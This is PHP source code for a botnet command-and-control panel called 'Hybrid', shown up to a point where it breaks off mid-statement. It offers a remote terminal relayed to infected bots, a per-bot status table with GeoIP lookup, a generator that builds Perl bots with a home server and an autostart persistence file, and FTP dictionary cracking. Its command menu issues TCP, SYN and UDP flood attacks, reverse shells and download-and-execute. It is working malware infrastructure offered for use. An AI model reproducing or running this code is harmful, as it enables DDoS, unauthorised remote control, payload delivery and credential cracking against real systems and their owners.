<?php

require_once("GeoIP/geoip.inc");

$gi = geoip_open("GeoIP/GeoIP.dat",GEOIP_STANDARD);
global $current_ip; 
global $current_port; // for e.r.t.e connection 
$prot = 1; 
/*Login to admin panel*/
$name='c4ca4238a0b923820dcc509a6f75849b'; // md5 , you want to edit this (currently: 1)
/*Password for admin login*/
$pass='c4ca4238a0b923820dcc509a6f75849b'; // md5 , you want to edit this (currently: 1)
if($prot == 1) { 
if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER'])!==$name || md5($_SERVER['PHP_AUTH_PW'])!==$pass){  
header('WWW-Authenticate: Basic realm="Hybrid Remote Administration Control System"');header('HTTP/1.1 401 Unauthorized'); 
exit("Admin panel: Access Denied");}} 

$POST_MAX_SIZE = ini_get('post_max_size'); // POST request max size
$UP_MAX_SIZE = ini_get('upload_max_filesize'); // upload max size
$DICTIONARY_PATH = "dict/";
$box = $_POST['box'];


/*******************************************************************/
/************YOU HAVE TO EDIT THIS!!!!!!!!**************************/
/*******************************************************************/
$host = 	"localhost"; //database host  
$login = "root"; //database user   
$password = "toor"; //password for database 
$database = "hybrid"; // databse name 
$table = "bots"; // will be created automatically
/*******************************************************************/
/********************YOU HAVE TO EDIT THIS!!!***********************/
/*******************************************************************/ 




function dbconnection($h, $l, $p, $d) {
	$conn=mysql_connect($h,$l,$p); 
	if ($conn===FALSE) {  
	print('connection failed'); 
	}   
	$seldb=mysql_select_db($d); 
	if ($seldb==FALSE){ 
	print('selection failed');
	}
}  

$table_erte_configuration = "erte_configuration";
$ftp_table = "ftp_table";
$help_table = "help_table";

$help_me = $_POST['help_section'];
dbconnection($host, $login, $password, $database);

			$res = mysql_query("SELECT * FROM $table_erte_configuration");
			while ($row = mysql_fetch_assoc($res)) {
				$current_ip = $row[ip];
				$current_port = $row[port];
			}

			
function SendCommand($host, $port, $cmd){	// ripped from blacksun bot xD	
$return_buffer = "";	
		    $sock = fsockopen($host,$port,$errno,$errstr);   
		    if (!$sock) {
		        echo "cant connect to remote server!";
		    } else { 
		        fputs ($sock,$cmd);
		        while (!feof($sock)) 
		        { 
				  $ans = fgets($sock,999666);   
				  $return_buffer .= (htmlspecialchars($ans));
		        }
			}
			fclose ($sock);
		return $return_buffer;
} // end of rip 

/************************************************************************************
PHP Terminal class, originally by author 'bzrudi', modified by cross
for usage in this web panel
************************************************************************************/
class phpTerm{
function formatPrompt(){
	$user = posix_getlogin();
	$host = "x1m";
$_SESSION['prompt'] = posix_getlogin()."~# ";
}

function InitSession(){
		session_start();
		return true;
}

function initVars()
{
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset']))
{
	$_SESSION['cwd'] = getcwd();
	$_SESSION['history'] = array();
	$_SESSION['output'] = '';
	$_REQUEST['command'] ='';
}
}

function buildCommandHistory()
{
if(!empty($_REQUEST['command']))
{
	if(get_magic_quotes_gpc())
	{
		$_REQUEST['command'] = stripslashes($_REQUEST['command']);
	}
	
	// drop old commands from list if exists
	if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
	{
		unset($_SESSION['history'][$i]);
	}
	array_unshift($_SESSION['history'], $_REQUEST['command']);

	// append commmand */
	if(($_REQUEST['command']) === "shit"){
	$_SESSION['output'] .= "Your Question: "."{$_REQUEST['command']}"."\n";
	$_SESSION['output'] .= "{$_SESSION['prompt']}"."no fucking  xD"."\n";

	}
	//$_SESSION['output'] .= "{$_SESSION['prompt']}"."{$_REQUEST['command']}"."\n"; 
}
}

function buildJavaHistory()
{
	// build command history for use in the JavaScript 
	if (empty($_SESSION['history']))
	{
		$_SESSION['js_command_hist'] = '""';
	}
	else
	{
		$escaped = array_map('addslashes', $_SESSION['history']);
		$_SESSION['js_command_hist'] = '"", "' . implode('", "', $escaped) . '"';
	}
}

function outputHandle($aliases){
	global $current_ip; 
	global $current_port; // for e.r.t.e connection 
		chdir($_SESSION['cwd']);
		/* Alias expansion. */
		$length = strcspn($_REQUEST['command'], " \t");
		$token = substr(@$_REQUEST['command'], 0, $length);
		if (isset($aliases[$token]))
			$_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
		$bot_command = $_REQUEST['command'];
		if($bot_command != ""){
			$_SESSION['output'] .= "hybrid~# ".$bot_command."\n";
			$encoded = SendCommand($current_ip, $current_port, base64_encode($bot_command));
			$_SESSION['output'] .= base64_decode($encoded);
		}
}
} // end phpTerm
/************************************************************************************
End of php terminal class
************************************************************************************/

$terminal=new phpTerm;
if($terminal->InitSession()){
$terminal->initVars();
$terminal->buildCommandHistory();
$terminal->buildJavaHistory();
if(!isset($_SESSION['prompt'])): $terminal->formatPrompt(); endif;
$terminal->outputHandle($aliases);

}
?>  
<html><head><title>Hybrid Botnet Control System</title>
<style type="text/css">
.style1 {
        font-family: Geneva;
        font-size: 13px;
        color: white;
} 
form { margin:0px; padding:0px}
body {
	background-image: #000;
	background-attachment:fixed;
	background-position:center;
	background-repeat:repeat;
	background-color:black;
	color: #555;
	margin: 0 0;
	text-align: left;
	font: normal 0.7em sans-serif,Arial;
}

code {
	font: normal 1.1em serif, Arial;
	background: url(dark.jpg);
	color: #888;
	display: block;
	padding: 3px 6px;	
	margin-bottom: 12px;
}

.banner {
	font: normal 1.1em serif, Arial;
	background: url(images/bg.png);
	background-position:center;
	background-repeat:repeat;
	color: #888;
	width: 900px;
	text-align: left;
	display: block;
	padding: 3px 6px;
	
	margin-bottom: 12px;
	border:1px;
	border-style:solid;
	border-color:#383838 ;
}
a{ color:#FFFFFF; text-decoration:none}
a:hover{ text-decoration:underline}

textarea { 
border:1px solid #383838; 
background:transparent; 
color:ghostwhite;  
width:800px; 
height:auto; 
font-size: smaller;
font-family:georgia;
}
</style>
  <script type="text/javascript" language="JavaScript">
  var current_line = 0;
  var command_hist = new Array(<?php echo $_SESSION['js_command_hist']; ?>);
  var last = 0;

  function key(e) {
    if (!e) var e = window.event;

    if (e.keyCode == 38 && current_line < command_hist.length-1) {
      command_hist[current_line] = document.shell.command.value;
      current_line++;
      document.shell.command.value = command_hist[current_line];
    }

    if (e.keyCode == 40 && current_line > 0) {
      command_hist[current_line] = document.shell.command.value;
      current_line--;
      document.shell.command.value = command_hist[current_line];
    }

  }

function init() {
  document.shell.setAttribute("autocomplete", "off");
  document.shell.output.scrollTop = document.shell.output.scrollHeight;
  document.shell.command.focus();
}

</script>
</head>

<body bgcolor="#000000" text="#FFFFFF" onload="init()"> 

<center><div class="banner">
<center><h2><font color="orange" face="georgia">&copy  Hybrid Remote Administration Control System</font> </h2></center>
<center>
<a href = "index.php"><span class="style1">[ Terminal ]</span></a>
<a href = "?page=stats"><span class="style1">[ Statistics and Control Panel ]</span></a>
<a href = "?page=config"><span class="style1">[ Hybrid Generator ]</span></a>
<a href = "?page=dict"><span class="style1">[ Dictionary Files ]</span></a>
<a href = "?page=ftpcrack"><span class="style1">[ FTP Cracking Progress ]</span></a>
<a href = "?page=help"><span class="style1">[ Hybrid Help ]</span></a></center>
</div> </center>
<!--
<form name="form1" method="post" action="" enctype="multipart/form-data">
-->
<table style="border:#000000 1px solid; background:url(images/world.png) no-repeat" align="center">
<tr><td  style="width:900px;height:350px">
<?php
/**********************************************************************************/
// main page, this time focused on remote terminal 
if($_GET['page'] == ""){
?>

<h4><font color="orange" face="georgia">&raquo; Encrypted Remote Terminal Emulator </font></h4>
<table cellpadding="0" cellspacing="0">

<tr><td  colspan='2'>
<form name="shell" action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
<center>
<textarea name="output" readonly="readonly" cols="65" rows="20">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
echo rtrim($padding . $_SESSION['output']); 
?>
</textarea>
</center>
<p><?php echo "<font color='orange'><small>".get_current_user()."~# </small></font>"; ?> 
<input name="command" type="text" style="border-bottom:#383838 1px solid;border-top:none;border-left:none;border-right:none;background:transparent;color:#fff" onkeyup="key(event)" size="100" tabindex="1">
</p>

</form></td></tr>
<?php
}
/**********************************************************************************/
?>
<form name="form1" method="post" action="" enctype="multipart/form-data">
<?php 

dbconnection($host, $login, $password, $database); 
/**********************************************************************************************/
// everything regards help
if($_GET['page'] == "help") {
	if($help_me){
	$res = mysql_query("SELECT * FROM $help_table");
	$total_entries = mysql_num_rows($res);
	while ($row = mysql_fetch_assoc($res)) {
		$about = $row[about];
		$terminal_about = $row[terminal_about];
		$stats_about = $row[stats_about];
		$hygen_about = $row[hygen_about];
		$dict_about = $row[dict_about];
		$ftpcrack_about = $row[ftpcrack_about];
		$sleep_cmd_help = $row[sleep_cmd_help];
		$tcpstorm_cmd_help = $row[tcpstorm_cmd_help];
		$synstorm_cmd_help = $row[synstorm_cmd_help];
		$udp_cmd_help = $row[udp_cmd_help];
		$delbot_cmd_help = $row[delbot_cmd_help];
		$revsh_cmd_help = $row[revsh_cmd_help];
		$erte_cmd_help = $row[erte_cmd_help];
		$ftpcrack_cmd_help = $row[ftpcrack_cmd_help];
		$dlexec_cmd_help = $row[dlexec_cmd_help];
		}
	if($help_me == "about"){
			$array_description = explode("\n", $about);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "terminal_about"){
			$array_description = explode("\n", $terminal_about);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "stats_about"){
			$array_description = explode("\n", $stats_about);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "hygen_about"){
			$array_description = explode("\n", $hygen_about);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "dict_about"){
			$array_description = explode("\n", $dict_about);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "ftpcrack_about"){
			$array_description = explode("\n", $ftpcrack_about);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "sleep_cmd_help"){
			$array_description = explode("\n", $sleep_cmd_help);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "tcpstorm_cmd_help"){
			$array_description = explode("\n", $tcpstorm_cmd_help);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "synstorm_cmd_help"){
			$array_description = explode("\n", $synstorm_cmd_help);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "udp_cmd_help"){
			$array_description = explode("\n", $udp_cmd_help);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "delbot_cmd_help"){
			$array_description = explode("\n", $delbot_cmd_help);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "revsh_cmd_help"){
			$array_description = explode("\n", $revsh_cmd_help);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "erte_cmd_help"){
			$array_description = explode("\n", $erte_cmd_help);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "ftpcrack_cmd_help"){
			$array_description = explode("\n", $ftpcrack_cmd_help);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		} else if ($help_me == "dlexec_cmd_help"){
			$array_description = explode("\n", $dlexec_cmd_help);
			$c = count($array_description, 0);
			for($i = 0; $i < $c; $i++){
				echo "<font size = '2' face = 'georgia' color = 'white'>".$array_description[$i]."</font><br>";
			}
		}
	}
}
/**********************************************************************************************/
// simple statistics table
if($_GET['page'] == "stats") {
echo "
<center><table style = 'width: 800px; height: 100px;' border = '1'>
<tr><td><center><font color='orange' face='georgia'><b><small>&raquo; Bot IP &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Country &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Current Command &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Bot Name &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Bot Message &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Check &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Action &laquo;</small></b></font></center></td></tr>";
$res = mysql_query("SELECT * FROM $table");
$total_entries = mysql_num_rows($res);
while ($row = mysql_fetch_assoc($res)) {
echo "
<tr><td><center><font color='ghostwhite' face = 'georgia' ><small>".$row[ip]."</small></font></center></td>
<td><center><font color='ghostwhite' face = 'georgia' ><small>".geoip_country_name_by_addr($gi, $row[ip])."</small></font></center></td>
<td><center><font color='ghostwhite' face = 'georgia'><small>".str_replace("!", " ", $row[cmd])."</small></font></center></td>
<td><center><font color='ghostwhite' face = 'georgia'><small>".$row[name]."</small></font></center></td>
<td><center><font color='ghostwhite' face = 'georgia'><small>".str_replace("!", " ", $row[msg])."</small></font></center></td>
<td><center><input type='checkbox' name='box[]' value='".$row[ip]."'></center></td>
<td><center><font color='ghostwhite' face = 'georgia'><small><a href = '?page=".$_GET['page']."&bot=delete&name=".$row[name]."'>Delete</a></small></font></center></td>
</tr>
";
}

	if($_GET['bot'] == "delete"){
	$my_ip = htmlspecialchars(addslashes($_GET['name']));
	mysql_query("DELETE FROM $table WHERE name = '$my_ip'");
	echo "<script>location=\"?page=".$_GET['page']."\";</script>"; 
	}
echo "</table></center>";
}
/**********************************************************************************************/

if($_GET['page'] == "config") {
?>
<h4><font color="orange" face="georgia">&raquo; Hybrid Generator</font></h4>
<table>
<tr>
<td><font color="orange"><small>&raquo; Base Bot Name:</small></font></td>
<td><input type="text" name="bot_name" value="Hybrid" size="50"></td>
</tr><tr>
<td><font color="orange"><small>&raquo; Directory to place bot:</small></font></td>
<td><input type="text" name="bot_dir" value="/usr/local/bin/" size="50"></td>
</tr><tr>
<td><font color="orange"><small>&raquo; Default Sleep Time:</small></font></td>
<td><input type="text" name="def_sleep_time" value="10" size="50"></td>
</tr><tr>
<td><font color="orange"><small>&raquo; Home Server:</small></font></td>
<td><input type="text" name="home_server" value="localhost" size="50"></td>
</tr><tr>
<td><font color="orange"><small>&raquo; Home Server Port:</small></font></td>
<td><input type="text" name="home_server_port" value="80" size="50"></td>
</tr><tr>
<td><font color="orange"><small>&raquo; Gate Dir:</small></font></td>
<td><input type="text" name="gate_dir" value="<?php print dirname($_SERVER['PHP_SELF']).'/'; ?>" size="50"></td>
</tr><tr>
<td><font color="orange"><small>&raquo; Gate Script:</small></font></td>
<td><input type="text" name="gate_script" value="getcmd.php" size="50"></td>
</tr><tr>
<td><font color="orange"><small>&raquo; Bot's User Agent:</small></font></td>
<td><input type="text" name="bot_ua" value="Hybrid_v.1.0" size="50"></td>
</tr><tr>
<td><font color="orange"><small>&raquo; Autostart File:</small></font></td>
<td><input type="text" name="autostart_file" value="/etc/profile" size="50"></td>
</tr>
</table>
<?php
}

if($_GET['page'] == "dict") { // $DICTIONARY_PATH
	if ($handle = opendir($DICTIONARY_PATH)) { 
		while (false !== ($file = readdir($handle))) {
			$info = pathinfo($file, PATHINFO_EXTENSION);
			if ($file != "." && $file != "..") {
				$full_path = $DICTIONARY_PATH.$file;
				$our_page = $_GET['page'];
				echo "&nbsp;&nbsp;&nbsp;&nbsp;<font color='orange' face = 'georgia'><small>[ $file ] | <a href = '?page=".$our_page."&act=delete&path=".$full_path."'>Delete</a></small></font><br>";
					if($_GET['act'] == "delete"){
					$path = htmlspecialchars(addslashes($_GET['path']));
					unlink($path);
					echo "<script>location=\"?page=".$_GET['page']."\";</script>"; 
				}			
			}
		}
	}
}

if($_GET['page'] == "ftpcrack") {
echo "
<center><table style = 'width: 800px; height: 100px;' border = '1'>
<tr><td><center><font color='orange' face='georgia'><b><small>&raquo; Ftp Ip &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Ftp Port &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Dict File &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Result &laquo;</small></b></font></center></td>
<td><center><font color='orange' face='georgia'><b><small>&raquo; Action &laquo;</small></b></font></center></td></tr>";
$res = mysql_query("SELECT * FROM $ftp_table");
$total_entries = mysql_num_rows($res);
while ($row = mysql_fetch_assoc($res)) {
echo "
<tr><td><center><font color='ghostwhite' face = 'georgia' ><small>".$row[ip]."</small></font></center></td>
<td><center><font color='ghostwhite' face = 'georgia'><small>".$row[port]."</small></font></center></td>
<td><center><font color='ghostwhite' face = 'georgia'><small>".basename($row[dict])."</small></font></center></td>
<td><center><font color='ghostwhite' face = 'georgia'><small>".str_replace("!", " ", $row[result])."</small></font></center></td>
<td><center><font color='ghostwhite' face = 'georgia'><small><a href = '?page=".$_GET['page']."&ftp=delete&ip=".$row[ip]."'>Delete</a></small></font></center></td>
</tr>
";
}

	if($_GET['ftp'] == "delete"){
	$my_ip = htmlspecialchars(addslashes($_GET['ip']));
	mysql_query("DELETE FROM $ftp_table WHERE ip = '$my_ip'");
	echo "<script>location=\"?page=".$_GET['page']."\";</script>"; 
	}
	
echo "</table></center>";
}
/**********************************************************************************************/
?>

</td></font></table>
<!-- -------------------------------------------------------------
Here begins bottom table, with options and buttons and controls :X
-------------------------------------------------------------- -->
<center><div class="banner">
<center><table>
<!--
<form name="form1" method="post" action="" enctype="multipart/form-data">
-->
<?php
if($_GET['page'] == "ftpcrack") {
?>
<br><tr>
<td><font color="orange"><small>FTP ip:</small></font></td>
<td><input type="text" name="ftp_ip" value="" size="50"></td>
</tr><tr>
<td><font color="orange"><small>FTP port:</small></font></td>
<td><input type="text" name="ftp_port" value="" size="50"></td>
</tr>
<?php
echo "<tr><td><font color='orange'><small>Dictionary File:</small></font></td>";
echo "<td><SELECT name='dict_file' style='width:365px'> 
<OPTION value='none' selected>None</OPTION>";
	if ($handle = opendir($DICTIONARY_PATH)) { 
		while (false !== ($file = readdir($handle))) {
			$info = pathinfo($file, PATHINFO_EXTENSION);
			if ($file != "." && $file != "..") {
				$full_path = $DICTIONARY_PATH.$file;
				$our_page = $_GET['page'];
				echo "<OPTION value='".$full_path."'>".$file."</OPTION>";			
			}
		}
	}
echo "</SELECT></td></tr>";
echo "<tr><td></td><td align = 'left'><input type=\"submit\" value=\" Add \" name=\"action\"></td></tr>";

if(!is_null($_POST['action'])){
	$ftp_ip = htmlspecialchars(addslashes($_POST['ftp_ip']));
	$ftp_port = htmlspecialchars(addslashes($_POST['ftp_port']));
	$dict_file = htmlspecialchars(addslashes($_POST['dict_file']));
	mysql_query("INSERT INTO $ftp_table (ip, port, dict) VALUES ('$ftp_ip', '$ftp_port', '$dict_file')");	
	echo "<script>location=\"?page=".$_GET['page']."\";</script>";
}

echo "</table><br></center>
<center><font size='1'>&copy www.x1machine.com</font></center>
</div></center>
</body></html>";
exit();
}

$ext = array('.txt');
if($_GET['page'] == "dict") {
	echo "
	<tr><td align = 'left'><font color='orange'><small>Max Upload Size:</small></font></td><td>".$POST_MAX_SIZE."</td></tr>
	<tr><td align = 'left'><font color='orange'><small>Max Post Size:</small></font></td><td>".$UP_MAX_SIZE."</td></tr>
	<tr><td align = 'left'><font color='orange'><small>Select new dictionary file:</small></font></td><td><input name='dict_file' type='file' size='50'></td></tr>
	<tr><td></td><td align = 'left'><input type=\"submit\" value=\" Upload \" name=\"action\"></td></tr>	
	";
	if(!is_null($_POST['action'])){
		$target_path = basename( $_FILES['dict_file']['name']);
		if($target_path != NULL){
			if(!in_array(strrchr($target_path,'.'),$ext)) die ("Bad file extension! $target_path");
			if(move_uploaded_file($_FILES['dict_file']['tmp_name'], $DICTIONARY_PATH.$target_path)) {
			echo "<script>location=\"?page=".$_GET['page']."\";</script>"; 
			} else{
			print ("<br>Error uploading dictionary file!<br>");
			}
		}
	}
echo "</table><br></center>
<center><font size='1'>&copy www.x1machine.com</font></center>
</div></center>
</body></html>";
exit();
}

if($_GET['page'] == "config") {
	echo "
<br>
<tr><td></td><td><input type='submit' value='Generate New Hybrid Bot' name='generate_new_hybrid_bot'></td></tr>
";

echo "</table><br></center>
<center><font size='1'>&copy www.x1machine.com</font></center>
</div></center>
</body></html>";
	if(!is_null($_POST['generate_new_hybrid_bot'])){
	$file = 'bot/test.txt';
	$bot_file = "bot/bot.zip";
	$search = array('hybrid_user_agent_by_x1machine', // user agent  [1]
					 'hybrid_wwwfolder_name_by_x1machine', // web gate dir [2] 
					 'hybrid_hell_gate_by_x1machine', // gate script name  [3]
					 'hybrid_home_by_x1machine', // home server  [4]
					 'hybrid_home_port_by_x1machine', // maybe you running web server on non-standard port? [5]
					 'hybrid_sleep_time_by_x1machine', // default bot time for staying inactive  [6]
					 'hybrid_autostart_by_x1machine', // autostart file, in most cases /etc/passwd  [7]
					 'hybrid_local_dir_by_x1machine', // dir on host machine where to store our bot  [8]
					 'hybrid_base_name_by_x1machine'); // bot's base name  [9]
	$bot_name = htmlspecialchars(addslashes($_POST['bot_name'])); //1
	$bot_dir = htmlspecialchars(addslashes($_POST['bot_dir'])); //2
	$def_sleep_time = htmlspecialchars(addslashes($_POST['def_sleep_time'])); //3
	$home_server = htmlspecialchars(addslashes($_POST['home_server'])); //4
	$home_server_port = htmlspecialchars(addslashes($_POST['home_server_port'])); //5
	$gate_dir = htmlspecialchars(addslashes($_POST['gate_dir'])); //6
	$gate_script = htmlspecialchars(addslashes($_POST['gate_script'])); //7
	$bot_ua = htmlspecialchars(addslashes($_POST['bot_ua'])); //8
	$autostart_file = htmlspecialchars(addslashes($_POST['autostart_file'])); //9
	if(!$bot_name || !$bot_dir || !$def_sleep_time || !$home_server ||
		!$home_server_port || !$gate_dir || !$gate_script || !$bot_ua ||
		!$autostart_file) {
			die("<center><h3><font color='red'>All fields must be filled!</font></h3></center>");			
			}
	$replace = array($bot_ua, // [1] $bot_ua
					  $gate_dir, // [2] $gate_dir
					  $gate_script, // [3] $gate_script
					  $home_server, // [4] $home_server
					  $home_server_port, // [5] $home_server_port
					  $def_sleep_time, // [6] $def_sleep_time
					  $autostart_file, // [7] $autostart_file
					  $bot_dir, // [8] $bot_dir
					  $bot_name); // [9] $bot_name
					  

	$lines = file($file);
	$HANDLE = fopen($bot_file, 'w') or die("<center><h3><font color='red'>can't open bot file!</font></h3></center>");	
	foreach($lines as $line_num => $line) {
    $text = str_replace($search, $replace, $line);
    fwrite($HANDLE, $text);
  //  print $text;
	}
	fclose($HANDLE);
	print "<center><h3><font color='oragne'>Bot Created! Download .zip file and change extension to .pl</font></h3></center>";
	echo "<meta HTTP-EQUIV=\"REFRESH\" content=\"3; url='". dirname($_SERVER['PHP_SELF'])."/bot/bot.zip'\">";
	}
exit();
}

if($_GET['page'] == "help") {
	echo "<br>
<tr><td><font color='orange'><small>Select help section:</small></font></td><td>
<SELECT name='help_section' style='width:365px'>";
//$res = mysql_query("SELECT ip FROM $table");
//while ($row = mysql_fetch_assoc($res)) {
print("<OPTION value = 'about' selected>About</OPTION>");
print("<OPTION value = 'sep1' >---------------------------------------------------</OPTION>");
print("<OPTION value = 'terminal_about' >About E.R.T.E.</OPTION>");
print("<OPTION value = 'stats_about' >About Statistics</OPTION>");
print("<OPTION value = 'hygen_about' >About Hybrid Generator</OPTION>");
print("<OPTION value = 'dict_about' >About Dictionary Files</OPTION>");
print("<OPTION value = 'ftpcrack_about' >About Ftp Cracking</OPTION>");
print("<OPTION value = 'sep2' >---------------------------------------------------</OPTION>");
print("<OPTION value = 'sleep_cmd_help' >Sleep Command Help</OPTION>");
print("<OPTION value = 'tcpstorm_cmd_help' >TCP Storm Command Help</OPTION>");
print("<OPTION value = 'synstorm_cmd_help' >SYN Storm Command Help</OPTION>");
print("<OPTION value = 'udp_cmd_help' >UDP Storm Command Help</OPTION>");
print("<OPTION value = 'delbot_cmd_help' >Delete Bot Command Help</OPTION>");
print("<OPTION value = 'revsh_cmd_help' >Reverse Shell Command Help</OPTION>");
print("<OPTION value = 'erte_cmd_help' >E.R.T.E Command Help</OPTION>");
print("<OPTION value = 'ftpcrack_cmd_help' >FTP Crack Command Help</OPTION>");
print("<OPTION value = 'dlexec_cmd_help' >Download &amp; Execute Command Help</OPTION>");
//}
echo "
</SELECT>
</td>
</tr>
<tr><td></td><td><input type='submit' value='Show Help Information' name='show_help'></td></tr>
";

echo "</table><br></center>
<center><font size='1'>&copy www.x1machine.com</font></center>
</div></center>
</body></html>";
exit();
}

if($_GET['page'] == "") {
	$current_ip = ""; $current_port = "";
	$res = mysql_query("SELECT * FROM $table_erte_configuration");
	while ($row = mysql_fetch_assoc($res)) {
		$current_ip = $row[ip];
		$current_port = $row[port];
	}
echo "
<tr><td><font color='orange'><small>Current Configuration:</small></font></td><td><b>".$current_ip.":".$current_port."</b></td></tr>
";
echo "<tr>
<td><font color=\"orange\"><small>Bot IP:</small></font></td>
<td>";
echo "<SELECT name=\"botip\" style=\"width:365px\"> ";
$res = mysql_query("SELECT ip FROM $table");
while ($row = mysql_fetch_assoc($res)) {
print("<OPTION value=".$row[ip].">".$row[ip]."</OPTION>");
}
echo "</SELECT>
</td>
</tr>";
echo "<tr>
<td><font color='orange'><small>Port:</small></font></td>
<td><input type='text' name='remo_port' value='' size='50'></td>
</tr>
<tr><td></td><td><input type='submit' value='Set Configuration' name='set_current_config'> <input type='reset' name='Submit2' value='Clear'></td></tr>
";
echo "</form></table></center>
<center><font size='1'>&copy www.x1machine.com</font></center>
</div></center>

</body></html>";

if(!is_null($_POST['set_current_config'])){
	$ip = htmlspecialchars(addslashes($_POST['botip']));
	$port = htmlspecialchars(addslashes($_POST['remo_port']));
	if($ip && $port){
	$res = mysql_query("SELECT ip FROM $table_erte_configuration");	
		$total_entries = mysql_num_rows($res);
		if($total_entries > 0){
			mysql_query("UPDATE $table_erte_configuration SET ip = '$ip', port = '$port'");
			echo "<script>location=\"index.php\";</script>"; 
			} else {
				mysql_query("INSERT INTO $table_erte_configuration (ip, port) VALUES ('$ip', '$port')");	
				echo "<script>location=\"index.php\";</script>"; 
				}
		}
	}
	
exit();
}
?>

<tr>
<td><font color="orange"><small>Bot Name:</small></font></td>
<td>
<!--
<form name="form1" method="post" action="" enctype="multipart/form-data">
-->
<SELECT name="botip" style="width:365px"> 
<?php
if($_GET['page'] == "stats") {
echo "<OPTION value='all'>All</OPTION>";
echo "<OPTION value='checked'>Checked</OPTION>";
}
$res = mysql_query("SELECT name FROM $table");
while ($row = mysql_fetch_assoc($res)) {
print("<OPTION value=".$row[name].">".$row[name]."</OPTION>");
}
?>
</SELECT>
</td>
</tr>
<tr><td><font color="orange"><small>Command:</small></font></td>
<td>
<SELECT name="newcmd" style="width:365px"> 
<OPTION value="sleep" selected>Sleep-[time(in secs)]</OPTION>
<OPTION value="ddos">TCP Storm-[Host]-[Port]-[Delay(0/1)]-[Packets]</OPTION>
<OPTION value="syn">SYN Storm-[Host]-[Port]-[Delay(0/1)]-[Packets]</OPTION>
<OPTION value="udpstorm">UDP Storm-[Host]-[Port]-[Time(sec)]-[Delay(0/1)]</OPTION>
<OPTION value="selfdel">Delete Bot from remote machine</OPTION>
<OPTION value="revsh">Reverse Shell-[Host]-[Port]</OPTION>
<OPTION value="remterm">E.R.T.E.-[Bot's Port]</OPTION>
<OPTION value="ftpcrack">FTP Crack -[Ftp Host]</OPTION>
<OPTION value="dl_exec">Download &amp; Execute -[Remote Host]-[Path 2 File]-[Local File]</OPTION>
</SELECT>
</td></tr>
<tr>
<td><font color="orange"><small>Argument 1:</small></font></td>
<td><input type="text" name="arg1" value="" size="50"></td>
</tr>
<tr>
<td><font color="orange"><small>Argument 2:</small></font></td>
<td><input type="text" name="arg2" value="" size="50"></td>
</tr>
<tr>
<td><font color="orange"><small>Argument 3:</small></font></td>
<td><input type="text" name="arg3" value="" size="50"></td>
</tr>
<tr>
<td><font color="orange"><small>Argument 4:</small></font></td>
<td><input type="text" name="arg4" value="" size="50"></td>
</tr>
<tr><td></td><td><input type="submit" value="Set Command" name="set"> <input type="reset" name="Submit2" value="Clear"></td></tr>
</form>
<?php
if(!is_null($_POST['set'])){ 

$newcmd = htmlspecialchars(addslashes($_POST['newcmd']."!".$_POST['arg1']."!".$_POST['arg2']."!".$_POST['arg3']."!".$_POST['arg4'])); 
$crycmd = $newcmd;		
$botip = htmlspecialchars(addslashes($_POST['botip'])); 
dbconnection($host, $login, $password, $database);
if($botip == "all"){ 
	if($_POST['newcmd'] == "ftpcrack"){
